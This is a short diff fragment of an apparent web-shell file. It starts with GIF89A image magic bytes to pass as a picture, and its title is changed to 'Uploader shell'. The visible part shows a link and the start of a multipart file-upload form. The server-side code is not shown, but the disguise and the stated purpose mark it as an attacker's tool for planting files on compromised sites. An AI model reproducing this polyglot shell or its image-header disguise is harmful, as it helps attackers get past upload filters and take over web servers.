@@ -2,7 +2,7 @@ GIF89A;
 �jpg
 
 
-<title>Gans</title>
+<title>Uploader shell</title>
 <center>
 <a href="?" style="color:lime;">Home</a>
 <form method='post' enctype='multipart/form-data'>
